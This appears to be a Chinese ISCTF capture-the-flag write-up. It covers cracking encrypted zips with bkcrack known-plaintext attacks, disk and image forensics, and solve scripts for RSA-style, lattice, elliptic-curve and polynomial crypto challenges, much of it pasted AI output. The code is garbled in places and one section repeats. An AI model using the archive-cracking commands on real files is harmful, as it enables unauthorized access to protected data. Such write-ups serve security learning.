+.\bkcrack -C flagggg3.zip -c flagggg2.zip -p plain_name.bin -o 26这次几乎 100% 能成功，因为这里面没有任何随机变量（时间、压缩率等），全是硬编码的字符串和长度。
+拿到 Keys 后：
+提取文件：
+PowerShell
+.\bkcrack -C flagggg3.zip -c flagggg2.zip -k  -d flagggg2.zip解压 flagggg2.zip： 注意，提取出来的 flagggg2.zip 可能还是加密的。如果它又要密码，看它的注释。如果它没有注释，可能还要再用一次 bkcrack（通常这种题目最后几层套路一样，你可以尝试用同一组 Key 提取下一层，或者重新攻击）。
+快试试这个 Offset 26 的战术！
+得到了三组密钥
+
+ae0c4b27 66c21cba b9a7958f
+
+
+.\bkcrack -C flagggg3.zip -c flagggg2.zip -k ae0c4b27 66c21cba b9a7958f -d flagggg2.zip
+
+得到flagggg2.zip，解压得到
+You deserve it !ISCTF{3f165c87-c0d4-4903-9c47-3a8d3b9c83df}
+ez_disk在FTK imager里打开文件，看到flag is here，提取出来发现需要密码
+
+提示是
+
+蓝鲨警局的阿sir说提取检材时末尾好像多了点东西
+
+直接在010里拉到最后，发现了FIFJ
+
+我们知道，JFIF是JPEG图片文件头的其中一部分，所以其实是倒序
+再往上看一下，发现了很明显的提示
+
+那我们把从这里开始到文件尾的数据全部复制下来，让AI写个脚本逆序回来
+import binasciidef reverse_hex_file(input_file, output_file):    print(f&quot;[-] 正在读取文件: &#123;input_file&#125; ...&quot;)        try:        # 1. 读取文件内容        with open(input_file, &#x27;r&#x27;) as f:            hex_str = f.read()                # 2. 清理数据：去除换行符、空格等杂质        clean_hex = hex_str.replace(&#x27;\n&#x27;, &#x27;&#x27;).replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\r&#x27;, &#x27;&#x27;)                # 3. 将十六进制字符串转换为原始字节流        # 注意：这里如果数据中有非法的hex字符会报错        byte_data = binascii.unhexlify(clean_hex)                print(f&quot;[-] 原始数据大小: &#123;len(byte_data)&#125; 字节&quot;)                # 4. 核心步骤：将字节流倒序 (Reverse)        # Python 切片操作 [::-1] 可以直接翻转序列        reversed_data = byte_data[::-1]                # 5. 简单的文件头检测        header = reversed_data[:4].hex().upper()        print(f&quot;[-] 倒序后的文件头: &#123;header&#125;&quot;)                file_ext = &quot;.bin&quot;        if header.startswith(&quot;FFD8FF&quot;):            print(&quot;[+] 检测到 JPEG 图片文件头 (FF D8 FF)&quot;)            file_ext = &quot;.jpg&quot;        elif header.startswith(&quot;89504E47&quot;):            print(&quot;[+] 检测到 PNG 图片文件头&quot;)            file_ext = &quot;.png&quot;        elif header.startswith(&quot;504B0304&quot;):            print(&quot;[+] 检测到 ZIP/Docx 文件头&quot;)            file_ext = &quot;.zip&quot;                    final_output = output_file + file_ext                # 6. 写入新文件        with open(final_output, &#x27;wb&#x27;) as f:            f.write(reversed_data)                    print(f&quot;[√] 成功！文件已保存为: &#123;final_output&#125;&quot;)            except Exception as e:        print(f&quot;[x] 发生错误: &#123;e&#125;&quot;)# 执行逻辑if __name__ == &#x27;__main__&#x27;:    # 确保你已经创建了 data.txt 并放入了数据    input_filename = &#x27;data.txt&#x27;     output_filename = &#x27;flag_image&#x27;        reverse_hex_file(input_filename, output_filename)
+
+得到一张图片
+VScode打开，发现一堆零宽字符还有一堆神秘文字（
+
+
+得到密码：this_p@ssw0rd_tha7_9ou_caN_n0t _brut3_Forc3_hhhhhhhhhhhhhhaHaa_no0b
+flag：ISCTF{320303e2-5c6a-489a-bcd3-e96a69a3eefc}
+爱玩游戏的小蓝鲨尝试打开压缩包，但是根本打不开，拖进010里看，发现缺了压缩包文件头
+
+补上文件头50 4B 03 04，打开得到米哈游_rbg_tb.py，十分莫名其妙，扔给AI分析
+解题步骤
+你需要编写一个脚本将这些像素点还原成图片。核心难点在于确定图片的宽和高。1. 统计像素总数并分解因子你需要先统计文件中一共有多少个 (r,g,b) 元组。假设总数为 $N$，图片的宽度 $W$ 和高度 $H$ 必须满足 $W \times H &#x3D; N$。通常 $W$ 和 $H$ 都是整数，且图片通常是长方形或正方形，你可以尝试 $N$ 的常见因子组合。2. 编写 Python 脚本复原图片你可以使用 Python 的 PIL (Pillow) 库来生成图片。以下是为你准备的解题脚本（请确保安装了 Pillow 库：pip install pillow）：
+from PIL import Imageimport ast# 1. 读取文件内容filename = &#x27;米哈游_rbg_tb.py&#x27;pixels = []try:    with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        lines = f.readlines()        for line in lines:            # 去除空白字符并解析元组            line = line.strip()            if line:                # 这一步将字符串 &quot;(255,255,255)&quot; 转换为元组 (255, 255, 255)                # 如果文件里全是元组格式，可以使用 ast.literal_eval                try:                    pixel = ast.literal_eval(line)                    pixels.append(pixel)                except:                    passexcept FileNotFoundError:    print(f&quot;请确保文件 &#123;filename&#125; 在当前目录下&quot;)    exit()total_pixels = len(pixels)print(f&quot;像素总数: &#123;total_pixels&#125;&quot;)# 2. 尝试寻找合适的宽和高# 常见的图片宽度可能是几百到一千多。我们打印出所有能整除的宽及对应的高。possible_dimensions = []for w in range(1, int(total_pixels**0.5) + 1):    if total_pixels % w == 0:        h = total_pixels // w        possible_dimensions.append((w, h))        # 也可以反过来 (h, w)        possible_dimensions.append((h, w))print(&quot;可能的尺寸 (宽 x 高):&quot;)# 过滤掉过于极端的尺寸（例如宽度为1），通常寻找比例接近 1:1, 4:3, 16:9 的potential_dims = [d for d in possible_dimensions if 0.2 &lt; d[0]/d[1] &lt; 5]for dim in potential_dims:    print(dim)# 3. 生成图片（假设你找到了最合适的尺寸，比如 width, height）# 这里需要你根据上面打印出的尺寸，手动填入或者尝试几个最可能的# 比如如果总数是 10000，可能是 100x100。# 假设我们选一个最可能的尺寸（你可以根据打印结果修改下面的 width）if potential_dims:    # 自动选择一个看起来最像正常图片的尺寸（宽度较大的那个，或者中间的）    # 通常杂项题的图片宽度在 500-1920 之间    best_guess = sorted(potential_dims, key=lambda x: abs(x[0] - x[1]))[-1] # 选一个接近正方形的尝试    # 或者手动指定，例如：    # width = 1920     width = best_guess[0]     height = best_guess[1]        print(f&quot;尝试生成图片: &#123;width&#125;x&#123;height&#125;&quot;)        img = Image.new(&#x27;RGB&#x27;, (width, height))        # 4. 处理 RBG 问题    # 题目提示 rbg，可能意味着原数据是 (R, B, G) 顺序，需要改为 (R, G, B)    # 或者是正常的 RGB。可以生成两张图对比。        # 模式1: 直接按 RGB 填充    img_rgb = Image.new(&#x27;RGB&#x27;, (width, height))    img_rgb.putdata(pixels)    img_rgb.save(f&quot;result_rgb_&#123;width&#125;x&#123;height&#125;.png&quot;)    print(f&quot;已保存 result_rgb_&#123;width&#125;x&#123;height&#125;.png&quot;)    # 模式2: 处理 RBG -&gt; RGB (交换后两个通道)    pixels_rbg_fixed = []    for r, b, g in pixels: # 注意这里假设文件里是 R, B, G         pixels_rbg_fixed.append((r, g, b)) # 换回 R, G, B        img_rbg = Image.new(&#x27;RGB&#x27;, (width, height))    img_rbg.putdata(pixels_rbg_fixed)    img_rbg.save(f&quot;result_rbg_fixed_&#123;width&#125;x&#123;height&#125;.png&quot;)    print(f&quot;已保存 result_rbg_fixed_&#123;width&#125;x&#123;height&#125;.png (如果是rbg格式)&quot;)else:    print(&quot;未能找到合适的尺寸因子，请检查数据完整性。&quot;)
+让AI多跑了几次，得到了
+
+只能看提示了
+搜了一下，刻律德菈是崩坏星穹铁道里翁法罗斯的角色
+
+搜到了这堆文字
+逐个对照后得到
+QKEMKal4t_k4nT_auMm3_U0Kv_yzV94e3_kg_yp3_O0teI  
+直接扔给AI解密一下
+这是一道经典的**维吉尼亚密码（Vigenère Cipher）**变种题目。1. 密钥分析根据提示 QKEMK 对应 ISCTF，我们可以反推密钥。维吉尼亚密码的原理是 $Cipher &#x3D; (Plain + Key) \pmod{26}$。反之，密钥 $Key &#x3D; (Cipher - Plain) \pmod{26}$。我们来看前缀的对应关系：I (8) $\to$ Q (16): $16 - 8 &#x3D; 8$ ($\to$ I)S (18) $\to$ K (10): $10 - 18 &#x3D; -8 \equiv 18$ ($\to$ S)C (2) $\to$ E (4): $4 - 2 &#x3D; 2$ ($\to$ C)T (19) $\to$ M (12): $12 - 19 &#x3D; -7 \equiv 19$ ($\to$ T)F (5) $\to$ K (10): $10 - 5 &#x3D; 5$ ($\to$ F)可以看出，密钥（Key）就是 ISCTF 本身。2. 解密过程使用密钥 ISCTF 对后面的密文进行解密。规则：$Plain &#x3D; (Cipher - Key) \pmod{26}$。非字母字符（如数字、下划线）保持不变，并跳过密钥索引。大小写保持不变。密文片段 1: al4t_k4nT_aua - I &#x3D; sl - S &#x3D; t4 (不变)t - C &#x3D; r_ (不变)k - T &#x3D; r4 (不变)n - F &#x3D; iT - I &#x3D; L_ (不变)a - S &#x3D; iu - C &#x3D; s明文 1: st4r_r4iL_is (Star Rail is)密文片段 2: Mm3_U0Kv_yzVM - T &#x3D; Tm - F &#x3D; h3 (不变)_ (不变)U - I &#x3D; M0 (不变)K - S &#x3D; Sv - C &#x3D; t_ (不变)y - T &#x3D; fz - F &#x3D; uV - I &#x3D; N明文 2: Th3_M0St_fuN (The Most Fun)密文片段 3: 94e3_kg_yp3_O0teI9 (不变)4 (不变)e - S &#x3D; m3 (不变)_ (不变)k - C &#x3D; ig - T &#x3D; n_ (不变)y - F &#x3D; tp - I &#x3D; h3 (不变)_ (不变)O - S &#x3D; W0 (不变)t - C &#x3D; re - T &#x3D; lI - F &#x3D; D明文 3: 94m3_in_th3_W0rlD (Game in the World)3. 最终结果将所有解密后的片段拼接起来，这句话是：”Star Rail is The Most Fun Game in the World”（星穹铁道是世界上最好玩的游戏）。按照常见的CTF格式，flag应该是：ISCTF{st4r_r4iL_is_Th3_M0St_fuN_94m3_in_th3_W0rlD}
+沉迷数学的小蓝鲨
+文件末尾为3xXvfzai
+判断出是base58加密
+
+得到的zigzag
+直接问AI
+太棒了！这个线索直接改变了整个解题方向。
+“23xXvfzai” Base58 解码后是 “zigzag”。
+这意味着：
+之前的 Arnold 变换是误导（或者只是一部分，但既然 Arnold 跑不出结果，大概率是纯误导）。真正的置乱算法是 Zigzag（之字形扫描）。enc.png 这张乱码图，实际上是将原图（二维码）的像素按照 Zigzag 顺序读取后，平铺生成的。我们要做的就是：按顺序读取 enc.png 的每一个像素，然后按照 Zigzag 的路径把它们填回一个新的正方形图片中。Zigzag 还原脚本请运行下面的脚本，它会将乱码图中的像素按照 Zigzag 路径重新排列。
+
+import cv2
+import numpy as np
+def zigzag_decode():
+    filename = 'enc.png'
+    img = cv2.imread(filename)
+    
+if img is None:
+    print(&quot;未找到 enc.png&quot;)
+    return
+h, w, _ = img.shape
+
+# Zigzag 变换通常基于正方形矩阵
+# 如果图片不是正方形，可能需要裁剪或补全，但CTF通常给正方形
+N = h 
+if h != w:
+    print(f&quot;警告：图片非正方形 ({w}x{h})，尝试按较短边处理...&quot;)
+    N = min(h, w)
+    img = img[:N, :N]
+print(f&quot;开始 Zigzag 还原，尺寸: {N}x{N}&quot;)
+# 1. 将乱码图的像素拉平（按行读取，即 Linear Read）
+# 这就是乱码图现在的存储顺序
+flat_pixels = img.reshape(-1, 3)
+
+# 2. 创建新画布
+restored_img = np.zeros((N, N, 3), dtype=np.uint8)
+
+# 3. 生成 Zigzag 路径坐标
+# 算法逻辑：遍历所有对角线和之字形路径
+row, col = 0, 0
+going_down = False # 初始方向
+
+pixel_idx = 0
+total_pixels = N * N
+
+while pixel_idx &lt; total_pixels:
+    # 将当前列表里的像素，填入 Zigzag 的坐标位置
+    restored_img[row, col] = flat_pixels[pixel_idx]
+    pixel_idx += 1
+    
+    # 计算下一个坐标
+    if going_down:
+        if col == 0 or row == N - 1:
+            going_down = False
+            if row == N - 1:
+                col += 1
+            else:
+                row += 1
+        else:
+            row += 1
+            col -= 1
+    else:
+        if row == 0 or col == N - 1:
+            going_down = True
+            if col == N - 1:
+                row += 1
+            else:
+                col += 1
+        else:
+            row -= 1
+            col += 1
+# 保存结果
+output_filename = &#39;flag_zigzag.png&#39;
+cv2.imwrite(output_filename, restored_img)
+print(f&quot;还原完成！请查看: {output_filename}&quot;)
+
+# 顺便生成一个旋转90度的版本，防止方向不对
+cv2.imwrite(&#39;flag_zigzag_rotated.png&#39;, cv2.rotate(restored_img, cv2.ROTATE_90_CLOCKWISE))
+
+if name &#x3D;&#x3D; ‘main‘:    zigzag_decode()
+预期结果运行脚本后，查看生成的 flag_zigzag.png。你应该能看到一个清晰的二维码。扫描这个二维码，应该就能得到真正的 Flag 了。原理解析：出题人把二维码的像素点像贪吃蛇一样（之字形）读出来，然后一行一行地贴到了现在的 enc.png 上，所以你看到的是被拉伸的横纹（那是像素原本的邻接关系被破坏后的样貌）。我们现在只是把这个过程逆转回去。
+得到图片
+把这张图片和flag.png进行异或，得到另一张二维码
+import cv2import numpy as npdef final_decrypt():    # 读取两张图片    # img_zigzag: 上一步还原出来的图片 (左图)    # img_fake: 题目原本给的假二维码 (右图)    img_zigzag = cv2.imread(&#x27;flag_zigzag.png&#x27;)    img_fake = cv2.imread(&#x27;flag.png&#x27;)    if img_zigzag is None or img_fake is None:        print(&quot;错误：请确保文件夹里有 flag_zigzag.png 和 fake_qr.png&quot;)        return    # 确保尺寸一致    if img_zigzag.shape != img_fake.shape:        img_zigzag = cv2.resize(img_zigzag, (img_fake.shape[1], img_fake.shape[0]))    print(&quot;正在进行 XOR 解密...&quot;)    # 1. 执行异或操作    # Flag = Zigzag图 ^ 假二维码    flag_img = cv2.bitwise_xor(img_zigzag, img_fake)    # 2. 修复定位符 (Finder Patterns)    # 因为 定位符 ^ 定位符 = 0 (全黑)，会导致二维码无法扫描    # 我们需要把假二维码的三个角落（左上、右上、左下）复制回去        h, w, _ = flag_img.shape    # 估算定位符大小，通常二维码定位符占边长的 1/5 到 1/6 左右    # 这里取 20% 比较保险，覆盖大一点没关系，只要不盖住数据区    corner_size = int(w * 0.22)     # 复制左上角    flag_img[0:corner_size, 0:corner_size] = img_fake[0:corner_size, 0:corner_size]    # 复制右上角    flag_img[0:corner_size, w-corner_size:w] = img_fake[0:corner_size, w-corner_size:w]    # 复制左下角    flag_img[h-corner_size:h, 0:corner_size] = img_fake[h-corner_size:h, 0:corner_size]        # 顺便尝试修复右下角的对齐块 (Alignment Pattern)    # 大概位置在右下角往里一点    align_start = int(w * 0.7)    flag_img[align_start:h, align_start:w] = img_fake[align_start:h, align_start:w]    # 保存最终结果    cv2.imwrite(&#x27;final_flag.png&#x27;, flag_img)    print(&quot;解密完成！Flag二维码已保存为: final_flag.png&quot;)    print(&quot;请扫描这张图片获取 Flag。&quot;)if __name__ == &#x27;__main__&#x27;:    final_decrypt()
+
+
+最后再把几个角补全一下，得到最终的二维码
+
+扫出来得到：ISCTF{fbf1a6d6-95e4-4a1c-95fd-7d2f03a16b20}
+CryptoPower towerfrom Crypto.Util.number import long_to_bytes# 1. 题目数据n = 107502945843251244337535082460697583639357473016005252008262865481138355040617c = 114092817888610184061306568177474033648737936326143099257250807529088213565247t = 6039738711082505929# 2. 根据截图设置已知因子p1 = 127p2 = 841705194007# 计算第三个因子 p3# 因为 FactorDB 显示这是 &quot;FF&quot; (Fully Factored)，说明剩下的也是质数p3 = n // (p1 * p2)print(f&quot;[*] Factors identified:&quot;)print(f&quot;    p1 = &#123;p1&#125;&quot;)print(f&quot;    p2 = &#123;p2&#125;&quot;)print(f&quot;    p3 = &#123;p3&#125;...&quot;)# 3. 计算正确的欧拉函数 phi(n)# 对于合数 n = p1 * p2 * p3，phi(n) = (p1-1)*(p2-1)*(p3-1)phi_n = (p1 - 1) * (p2 - 1) * (p3 - 1)print(f&quot;[*] Calculated phi(n)&quot;)# 4. 利用拓展欧拉定理计算 l# l = 2^(2^t) mod n# 核心步骤：先计算指数相对于 phi(n) 的模# exponent = 2^t mod phi(n) + phi(n)# (加上 phi(n) 是为了满足拓展欧拉定理 b &gt;= phi(m) 的条件，防止指数过小)exponent = pow(2, t, phi_n) + phi_n# 计算 ll = pow(2, exponent, n)# 5. 解密m = c ^ lflag = long_to_bytes(m)print(f&quot;\n[+] Flag: &#123;flag.decode()&#125;&quot;)
+运行得到
+[*] Factors identified:    p1 = 127    p2 = 841705194007    p3 = 1005672644717572752052474808610481144121914956393489966622615553...[*] Calculated phi(n)[+] Flag: ISCTF&#123;Euler_1s_v3ry|useful!!!!!&#125;
+
+
+
+baby math# --- 不要导入 Crypto，直接使用下面的替代函数 ---def long_to_bytes(val):    val = int(val)    return val.to_bytes((val.bit_length() + 7) // 8, &#x27;big&#x27;)# --- 题目数据 ---x_val_str = &quot;0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100&quot;enc_val_str = &quot;1.24839978408728580181183027675785982784764821592156892598136000363397267152291738689909414790691435938223032351375697399608345468567445269769342300325192248438038963977207296241971217955178443170598629648414706345216797043374408541203167719396818925953801387623884200901703606288664141375049626635852e52&quot;# --- 核心逻辑 ---R = RealField(1000)x = R(x_val_str)enc = R(enc_val_str)c_val = cos(x)s_val = sin(x)# 构造格K = 2**1000M = Matrix(ZZ, [    [1, 0, Integer(c_val * K)],    [0, 1, Integer(s_val * K)],    [0, 0, -Integer(enc * K)]])# LLL 规约print(&quot;Calculating...&quot;)L = M.LLL()# 提取结果vec = L[0]a = abs(vec[0])b = abs(vec[1])print(f&quot;a = &#123;a&#125;&quot;)print(f&quot;b = &#123;b&#125;&quot;)try:    # 拼接 Flag    flag = long_to_bytes(a) + long_to_bytes(b)    print(&quot;\n---------------------------&quot;)    print(&quot;Flag:&quot;, flag.decode())    print(&quot;---------------------------&quot;)except Exception as e:    print(&quot;Error decoding:&quot;, e)
+
+
+小蓝鲨的密码箱
+参数abc随便输入一串数字，解密I，发现得到的密文正好是flag的第一个字符串，后面保持参数不变，把a到z，A到Z，0到9全部解密一遍，一一对照即可，包括{}和-也是需要解密的，不过貌似大写字母只有ISCTF，小写字母只有a到f，而且这个题关了靶机之后，就算参数设置得一样，得到的flag也不一样，由于过程比较复杂，就不再复现一遍了
+这是一道结合了 RSA（实际上是多项式求根）和 AES 的密码学题目。题目分析加密逻辑分析：题目生成了一个 16 字节的 AES 密钥 aes_key，将其转换为整数 m。构建了一个关于 m 的多项式：$c &#x3D; (m^3 + a2 \cdot m^2 + a1 \cdot m + a0) \pmod N$。最后使用 AES-CBC 模式加密了 FLAG。我们需要求出 aes_key (即 m) 才能解密 FLAG。数值大小分析（解题关键）：m 是 16 字节，即 128 位。$m^3$ 大约是 $128 \times 3 &#x3D; 384$ 位。a2_high 很小，a1, a0 也很小。计算得到的密文 c 大约是 $10^{117}$，也就是 390 位左右。而模数 $N$ 是两个 512 位素数的乘积，即 1024 位。结论：因为 $m^3 + \dots$ 的结果远小于 $N$，所以模 $N$ 运算实际上没有发生截断。这变成了一个在整数域 $\mathbb{Z}$ 上的三次方程求根问题：$$m^3 + a2 \cdot m^2 + a1 \cdot m + (a0 - c) &#x3D; 0$$未知参数处理：题目给出了 a2_high，并说明 a2_high &#x3D; a2 &gt;&gt; 16。这意味着 a2 的低 16 位是未知的。由于 16 位非常小 ($2^{16} &#x3D; 65536$)，我们可以爆破这低 16 位。解题思路遍历 x 从 0 到 65535。构造猜测的 a2 &#x3D; (a2_high &lt;&lt; 16) + x。对于确定的 a2，方程 $f(m) &#x3D; m^3 + a2 \cdot m^2 + a1 \cdot m + (a0 - c) &#x3D; 0$ 是一个单调递增函数（在 $m &gt; 0$ 时）。使用二分查找（Binary Search）在 $0$ 到 $2^{128}$ 范围内快速寻找整数根 m。如果找到整数根，则说明爆破成功，将 m 转回字节，作为 AES 密钥解密 FLAG。EXP (Python 脚本)你可以直接运行以下代码来获取 Flag：Python
+import sysfrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 题目给出的参数c = 3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117a2_high = 9012778LOW_BITS = 16a1 = 621315a0 = 452775142iv_hex = &quot;bf38e64bb5c1b069a07b7d1d046a9010&quot;ct_hex = &quot;8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5&quot;# 准备解密数据iv = bytes.fromhex(iv_hex)ct = bytes.fromhex(ct_hex)# 目标方程: m^3 + a2*m^2 + a1*m + a0 = c# 移项后: m^3 + a2*m^2 + a1*m = c - a0target = c - a0print(&quot;[*] 开始爆破 a2 的低 16 位...&quot;)found_m = None# 爆破 a2 的低 16 位for low_part in range(2**LOW_BITS):    # 构造完整的 a2    a2 = (a2_high &lt;&lt; LOW_BITS) + low_part        # 使用二分查找解方程：f(x) = x^3 + a2*x^2 + a1*x - target = 0    # m 是 16字节，即 128 bit，范围在 0 到 2^129 之间    low = 0    high = 1 &lt;&lt; 130         while low &lt;= high:        mid = (low + high) // 2        val = mid**3 + a2 * (mid**2) + a1 * mid                if val == target:            found_m = mid            print(f&quot;[+] 找到正确的 m! (Low bits: &#123;low_part&#125;)&quot;)            break        elif val &lt; target:            low = mid + 1        else:            high = mid - 1                if found_m:        breakif found_m:    try:        # 还原 AES Key        key = long_to_bytes(found_m)        print(f&quot;[+] Recovered Key: &#123;key.hex()&#125;&quot;)                # AES 解密        cipher = AES.new(key, AES.MODE_CBC, iv=iv)        plaintext = unpad(cipher.decrypt(ct), 16)                print(&quot;\n&quot; + &quot;=&quot;*40)        print(f&quot;FLAG: &#123;plaintext.decode()&#125;&quot;)        print(&quot;=&quot;*40)    except Exception as e:        print(f&quot;[-] 解密失败: &#123;e&#125;&quot;)else:    print(&quot;[-] 未找到解&quot;)
+为什么这样做有效？通常在 RSA 中，如果 $c &#x3D; m^e \pmod N$ 且 $m$ 很小使得 $m^e &lt; N$，我们可以直接对 $c$ 开 $e$ 次方根。在这道题中，虽然加了干扰项 $f$，但原理是一样的。因为 $m$ 只有 128 bit，其最高次项 $m^3$ 只有约 384 bit，远小于 $N$ 的 1024 bit。这意味着模运算没有起到混淆作用，我们面对的只是一个普通的代数方程。结合对缺失系数的小范围爆破（Brute-force）和对解的二分查找（Binary Search），可以瞬间求出 Key。
+
+沉迷数学的小蓝鲨这是一个 SageMath 内部实现的 Bug（discrete_log 在某些版本的 pollard_rho 实现中处理边界条件时会崩）。这不是你的问题，也不是算法的问题，纯粹是工具的 Bug。解决方案：我们改用 BSGS (Baby-Step Giant-Step) 算法。对于 47-bit 的因子（约 $10^{14}$），BSGS 需要约 $1.2 \times 10^7$ 次存储，大约占用 1-2 GB 内存，但它非常稳定，不会像 Pollard’s Rho 那样触发那个 Python 变量未定义的 Bug。请运行这个最终修正版脚本。我已将算法强制改为 bsgs，并保留了你之前算出来的前 4 个结果以节省时间。
+import hashlibimport timedef solve():    print(&quot;[-] 初始化参数...&quot;)    p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff    F = GF(p)        # 原始坐标    Gx = F(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296)    Gy = F(0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)    Qx = F(0xa61ae2f42348f8b84e4b8271ee8ce3f19d7760330ef6a5f6ec992430dccdc167)    Qy = F(0x8a3ceb15b94ee7c6ce435147f31ca8028d1dd07a986711966980f7de20490080)    # 1. 恢复参数 (直接使用你之前的结果)    a_rec = F(52664118448443955860322077159462073289103141319210569862572894217073966189859)    b_rec = F(84653718194830426353573195929205071523922071825329373213278172263032105315199)        E = EllipticCurve(F, [a_rec, b_rec])    G = E(Gx, Gy)    Q = E(Qx, Qy)    print(&quot;[-] 曲线构建完成。&quot;)    # 2. 已知的离散对数结果 (跳过前4个因子的计算)    known_results = [        (5, 2),        (73, 37),        (79, 4),        (103798181, 77916159)    ]        dlogs = [x[1] for x in known_results]    moduli = [x[0] for x in known_results]        # 3. 攻克最后一个因子 (使用 BSGS 避开 Sage Bug)    last_factor = 160009168835927    print(f&quot;[-] 正在使用 BSGS 计算因子: &#123;last_factor&#125; ...&quot;)    print(&quot;    这会占用一些内存，如果报错 MemoryError 请告诉我。&quot;)    print(&quot;    预计耗时: 30秒 - 2分钟&quot;)        order = E.order()    exponent = order // last_factor    G_sub = exponent * G    Q_sub = exponent * Q        try:        # 强制使用 bsgs，它比 pollard_rho 更稳定，虽然吃内存        t0 = time.time()        last_dl = discrete_log(Q_sub, G_sub, operation=&#x27;+&#x27;, ord=last_factor, algorithm=&quot;bsgs&quot;)        print(f&quot;    [OK] 耗时 &#123;time.time()-t0:.2f&#125;秒. 结果: &#123;last_dl&#125;&quot;)                dlogs.append(last_dl)        moduli.append(last_factor)            except Exception as e:        print(f&quot;[!] 计算失败: &#123;e&#125;&quot;)        return    # 4. CRT 恢复 k    print(&quot;[-] 正在合成最终的 k ...&quot;)    k_candidate = crt(dlogs, moduli)        print(f&quot;    k (decimal): &#123;k_candidate&#125;&quot;)    print(f&quot;    k (hex)    : &#123;hex(k_candidate)&#125;&quot;)    # 5. 验证与 Flag    if k_candidate * G == Q:        print(&quot;\n[SUCCESS] 验证通过！&quot;)        k_hex = hex(k_candidate)[2:]        if len(k_hex) % 2 != 0: k_hex = &#x27;0&#x27; + k_hex        flag_md5 = hashlib.md5(k_hex.encode()).hexdigest()        print(f&quot;Final Flag: ISCTF&#123;&#123;&#123;flag_md5&#125;&#125;&#125;&quot;)    else:        print(&quot;\n[FAIL] 验证失败。说明 k 比 76 bits 还要大。&quot;)        print(&quot;如果发生这种情况，必须手动攻击下一个 79-bit 因子 (需要 C++ 工具)。&quot;)solve()
+
+小蓝鲨的RSA密文这是一道结合了 RSA（实际上是多项式求根）和 AES 的密码学题目。题目分析加密逻辑分析：题目生成了一个 16 字节的 AES 密钥 aes_key，将其转换为整数 m。构建了一个关于 m 的多项式：$c &#x3D; (m^3 + a2 \cdot m^2 + a1 \cdot m + a0) \pmod N$。最后使用 AES-CBC 模式加密了 FLAG。我们需要求出 aes_key (即 m) 才能解密 FLAG。数值大小分析（解题关键）：m 是 16 字节，即 128 位。$m^3$ 大约是 $128 \times 3 &#x3D; 384$ 位。a2_high 很小，a1, a0 也很小。计算得到的密文 c 大约是 $10^{117}$，也就是 390 位左右。而模数 $N$ 是两个 512 位素数的乘积，即 1024 位。结论：因为 $m^3 + \dots$ 的结果远小于 $N$，所以模 $N$ 运算实际上没有发生截断。这变成了一个在整数域 $\mathbb{Z}$ 上的三次方程求根问题：$$m^3 + a2 \cdot m^2 + a1 \cdot m + (a0 - c) &#x3D; 0$$未知参数处理：题目给出了 a2_high，并说明 a2_high &#x3D; a2 &gt;&gt; 16。这意味着 a2 的低 16 位是未知的。由于 16 位非常小 ($2^{16} &#x3D; 65536$)，我们可以爆破这低 16 位。解题思路遍历 x 从 0 到 65535。构造猜测的 a2 &#x3D; (a2_high &lt;&lt; 16) + x。对于确定的 a2，方程 $f(m) &#x3D; m^3 + a2 \cdot m^2 + a1 \cdot m + (a0 - c) &#x3D; 0$ 是一个单调递增函数（在 $m &gt; 0$ 时）。使用二分查找（Binary Search）在 $0$ 到 $2^{128}$ 范围内快速寻找整数根 m。如果找到整数根，则说明爆破成功，将 m 转回字节，作为 AES 密钥解密 FLAG。EXP (Python 脚本)你可以直接运行以下代码来获取 Flag：
+import sysfrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 题目给出的参数c = 3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117a2_high = 9012778LOW_BITS = 16a1 = 621315a0 = 452775142iv_hex = &quot;bf38e64bb5c1b069a07b7d1d046a9010&quot;ct_hex = &quot;8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5&quot;# 准备解密数据iv = bytes.fromhex(iv_hex)ct = bytes.fromhex(ct_hex)# 目标方程: m^3 + a2*m^2 + a1*m + a0 = c# 移项后: m^3 + a2*m^2 + a1*m = c - a0target = c - a0print(&quot;[*] 开始爆破 a2 的低 16 位...&quot;)found_m = None# 爆破 a2 的低 16 位for low_part in range(2**LOW_BITS):    # 构造完整的 a2    a2 = (a2_high &lt;&lt; LOW_BITS) + low_part        # 使用二分查找解方程：f(x) = x^3 + a2*x^2 + a1*x - target = 0    # m 是 16字节，即 128 bit，范围在 0 到 2^129 之间    low = 0    high = 1 &lt;&lt; 130         while low &lt;= high:        mid = (low + high) // 2        val = mid**3 + a2 * (mid**2) + a1 * mid                if val == target:            found_m = mid            print(f&quot;[+] 找到正确的 m! (Low bits: &#123;low_part&#125;)&quot;)            break        elif val &lt; target:            low = mid + 1        else:            high = mid - 1                if found_m:        breakif found_m:    try:        # 还原 AES Key        key = long_to_bytes(found_m)        print(f&quot;[+] Recovered Key: &#123;key.hex()&#125;&quot;)                # AES 解密        cipher = AES.new(key, AES.MODE_CBC, iv=iv)        plaintext = unpad(cipher.decrypt(ct), 16)                print(&quot;\n&quot; + &quot;=&quot;*40)        print(f&quot;FLAG: &#123;plaintext.decode()&#125;&quot;)        print(&quot;=&quot;*40)    except Exception as e:        print(f&quot;[-] 解密失败: &#123;e&#125;&quot;)else:    print(&quot;[-] 未找到解&quot;)
+
+
+
+
+逆向小蓝鲨的单片机_1这个题AI调了好久，就贴到最后一步吧
+你是对的，我重新审查了数据和之前的逻辑。
